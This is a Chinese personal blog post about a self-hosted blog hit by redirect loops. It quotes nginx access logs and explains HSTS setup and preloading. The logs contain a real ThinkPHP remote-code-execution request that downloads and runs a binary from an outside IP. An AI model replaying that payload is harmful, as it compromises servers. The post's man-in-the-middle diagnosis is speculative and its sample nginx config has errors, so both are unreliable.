---
title: 使用HSTS防范中间人攻击
toc: true
date: 2020-07-30 17:35:13
tags:
  - 网络
---

## 背景介绍

之前在自己的服务器上架设了[博客](https://zhiyulife.pp.ua)并发布到了公网，考虑到安全性还特意加了HTTPS支持。稳定运行一段时间之后前两个星期忽然就无法访问了，以下是我的破案纪实。

## 案发现场：博客无法访问

之前搭建的博客突然不能访问了，浏览器提示**重定向次数过多**，我就有了不好的预感，去服务器上看扫了一眼`nginx`访问日志，果然发现了一点猫腻。

```
41.230.21.146 - - [26/Jul/2020:04:06:50 +0800] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://45.95.168.230/taevimncorufglbzhwxqpdkjs/Meth.x86 -O thinkphp ; chmod 777 thinkphp ; ./thinkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 157 "-" "Uirusu/2.0"
93.171.157.190 - - [26/Jul/2020:04:28:29 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
162.243.128.166 - - [26/Jul/2020:05:10:37 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
177.96.170.216 - - [26/Jul/2020:05:21:32 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
35.220.228.17 - - [26/Jul/2020:05:33:38 +0800] "POST /spywall/timeConfig.php HTTP/1.1" 400 157 "-" "XTC"
46.105.117.7 - - [26/Jul/2020:05:36:30 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
141.101.105.202 - - [26/Jul/2020:05:36:30 +0800] "GET / HTTP/1.1" 301 169 "http://95.179.179.26:80/" "Mozilla/5.0 zgrab/0.x"
141.101.105.202 - - [26/Jul/2020:05:36:30 +0800] "GET / HTTP/1.1" 301 169 "https://zhiyulife.pp.ua/" "Mozilla/5.0 zgrab/0.x"
151.235.230.43 - - [26/Jul/2020:05:45:03 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
46.105.117.7 - - [26/Jul/2020:05:49:05 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 zgrab/0.x"
172.69.54.103 - - [26/Jul/2020:05:49:05 +0800] "GET / HTTP/1.1" 301 169 "https://95.179.179.26:443/" "Mozilla/5.0 zgrab/0.x"
172.69.54.103 - - [26/Jul/2020:05:49:05 +0800] "GET / HTTP/1.1" 301 169 "https://zhiyulife.pp.ua/" "Mozilla/5.0 zgrab/0.x"
139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /manager/top.asp HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /index.php/_login/in HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /11.txt HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /db/admin_yly.sql HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET / HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /cgi-bin HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
139.205.177.98 - - [26/Jul/2020:05:56:58 +0800] "GET /js/preload/example.txt HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
172.69.33.237 - - [26/Jul/2020:05:57:09 +0800] "GET /db/admin_yly.sql HTTP/1.1" 301 169 "http://95.179.179.26/db/admin_yly.sql" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
172.69.34.226 - - [26/Jul/2020:05:57:09 +0800] "GET /index.php/_login/in HTTP/1.1" 301 169 "http://95.179.179.26/index.php/_login/in" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
172.69.35.69 - - [26/Jul/2020:05:57:09 +0800] "GET / HTTP/1.1" 301 169 "http://95.179.179.26/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
172.69.33.185 - - [26/Jul/2020:05:57:09 +0800] "GET /js/preload/example.txt HTTP/1.1" 301 169 "http://95.179.179.26/js/preload/example.txt" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
172.69.33.43 - - [26/Jul/2020:05:57:09 +0800] "GET /11.txt HTTP/1.1" 301 169 "http://95.179.179.26/11.txt" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; KB974488)"
```

第一条日志就发现问题了，我的博客是个静态页面网站，跟PHP完全没有关系，而且URL后面跟的那一堆明显是攻击的函数。

```
invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://45.95.168.230/taevimncorufglbzhwxqpdkjs/Meth.x86 -O thinkphp ; chmod 777 thinkphp ; ./thinkphp ThinkPHP ; rm -rf thinkphp'
```

再看后面的日志，都是访问一些不知所云的页面，并且都是`301`重定向，因此我估计在重定向HTTPS的时候出现了问题。

## 追根溯源，锁定凶手

> 中间人攻击（英语：Man-in-the-middle attack，缩写：MITM）在密码学和计算机安全领域中是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。在中间人攻击中，攻击者可以拦截通讯双方的通话并插入新的内容。在许多情况下这是很简单的（例如，在一个未加密的Wi-Fi 无线接入点的接受范围内的中间人攻击者，可以将自己作为一个中间人插入这个网络）。
> 一个中间人攻击能成功的前提条件是攻击者能将自己伪装成每一个参与会话的终端，并且不被其他终端识破。中间人攻击是一个（缺乏）相互认证的攻击。大多数的加密协议都专门加入了一些特殊的认证方法以阻止中间人攻击。例如，SSL协议可以验证参与通讯的一方或双方使用的证书是否是由权威的受信任的数字证书认证机构颁发，并且能执行双向身份认证。
> 来自：[维基百科：中间人攻击](https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB)

中间人攻击是比较常见的网络攻击手段，如果通讯双方缺少有效的认证手段就有可能导致中间人攻击。

一般来说如果网站配置了HTTPS，双方通讯就都是可靠加密了。不过用户习惯很难直接改变，包括我也一样，不会特意去敲上一段`https://`，因此网站一般都会通过重定向HTTP到HTTPS来保证使用HTTPS。

从可见的日志推断，我认为自己的网站最有可能遭受了中间人攻击。

## 御敌于外：配置HSTS
基本确定了凶手之后，就可以查询解决方案。一番查找之后，发现针对中间人攻击，目前主要的方案是采用**HSTS**。

> HSTS（HTTP Strict Transport Security, HTTP严格传输安全协议）表明网站已经实现了TLS，要求浏览器对用户明文访问的Url重写成HTTPS，避免了始终强制302重定向的延时开销。
> 来自：[电商网站HTTPS实践之路（三）——性能优化篇](https://blog.csdn.net/zhuyiquan/article/details/71430020#21-hsts%E7%9A%84%E5%90%88%E7%90%86%E4%BD%BF%E7%94%A8)

### HSTS基本语法

落实到具体实现中，就是在响应中增加`Strict-Transport-Security`头部，其基本语法如下：

`Strict-Transport-Security: max-age=expireTime [; includeSubDomains] [; preload]`

| 参数              | 可选 | 说明                                                         |
| ----------------- | ---- | ------------------------------------------------------------ |
| max-age           | 必选 | 单位为秒，代表HSTS Header的过期时间，一般设置为1年，即 31536000秒。 |
| includeSubDomains | 可选 | 如果开启说明当前域名及子域名开启HSTS保护                     |
| preload           | 可选 | 只有当你申请将自己的域名加入到浏览器内置列表的时候才需要使用到它 |

### Nginx配置HSTS

对于`Nginx`来说，只要增加以下配置

```
server {
  listen xxx.abc.com;
  server_name xxx.abc.com;
  rewrite ^/(.*)$ https://$host$1 permanent;
}
server {
  listen       443 ssl;
  server_name  xxx.abc.com;
  # 增加头部信息
  add_header Strict-Transport-Security "max-age=172800; includeSubDomains";
  ssl_certificate      cert/server.crt;
  ssl_certificate_key  cert/server.key;

  ssl_session_cache    shared:SSL:1m;
  ssl_session_timeout  5m;

  ssl_ciphers  HIGH:!aNULL:!MD5;
  ssl_prefer_server_ciphers  on;

  location / {
    proxy_pass http://localhost:3001;
  }
}
```

### 预加载HSTS

不过从HSTS的原理来说即使配置了HSTS依然有被攻击的可能，浏览器第一次或者超期后访问网站时还是要再次请求HTTP。想要解决这个问题最好让浏览器在一开始就知道目标网站使用HTTPS，那么每次访问这个网站将都使用HTTPS进行请求。

预加载HSTS就是实现这个功能。Chrome、Firefox等浏览器内置了一份预加载列表，声明了需要使用HTTPS访问的网址，这样的话每次请求时浏览器内部就自动为其转换为HTTPS。

自建的网站可以申请加入预加载HSTS列表中，官方网址为：https://hstspreload.org 。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200730135803530.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JlaWppdXlpenVp,size_16,color_FFFFFF,t_70#pic_center)


需要满足以下几个要求：

> Submission Requirements
> If a site sends the preload directive in an HSTS header, it is considered to be requesting inclusion in the preload list and may be submitted via the form on this site.
> In order to be accepted to the HSTS preload list through this form, your site must satisfy the following set of requirements:
> 1. Serve a valid certificate.
> 2. Redirect from HTTP to HTTPS on the same host, if you are listening on port 80.
> 3. Serve all subdomains over HTTPS.
> 		- In particular, you must support HTTPS for the www subdomain if a DNS record for that subdomain exists.
> 4. Serve an HSTS header on the base domain for HTTPS requests:
> 		- The max-age must be at least 31536000 seconds (1 year).
> 		- The includeSubDomains directive must be specified.
> 		- The preload directive must be specified.
> 		- If you are serving an additional redirect from your HTTPS site, that redirect must still have the HSTS header (rather than the page it redirects to).

1. 有可信的证书
2. 如果网页有监听80端口，需要重定向到HTTPS
3. 所有子域名都要使用HTTPS
4. 添加HSTS响应头，
	- max-age 必须至少是 31536000 秒（1 年）。
	- 必须指定 includeSubDomains 参数。
	- 必须指定 preload 参数。
	- 如果该 HTTPS 网站存在其他重定向，那么重定向也必须具有 HSTS 头。

## 总结与疑问

其实除了那么多重定向的日志之外，我还在日志中发现了爬虫的痕迹。

以往我所开发的服务都是运行在内网中，就像还在象牙塔中的学生一样，高高筑起的围墙虽然限制了很多自由，但在很多情况下又是对我们的保护。只是将博客部署到公网的服务器上，险恶的现实就露出了自己的獠牙。

当然面对层出不穷的问题，退缩回象牙塔内并不能有所助益。因为网络的开放性注定了攻击者永远存在，因此熟悉并了解攻击者的手段，知难而上解决问题才能继续生存下去。

当然故事还远没有结束，我还是有许多疑问：
1. 中间人到底在哪里？是暗藏在我的电脑中？还是暗藏在我的服务器中？
2. 为什么会不断重定向？

## 参考资料
1. [对301重定向到HTTPS前遭遇中间人攻击的分析](https://blog.csdn.net/zhuyiquan/article/details/72654247)
2. [从 GitHub 受到中间人攻击一事再看 HSTS](https://cherysunzhang.com/2020/03/hsts-and-github-attacked-by-mitm/)
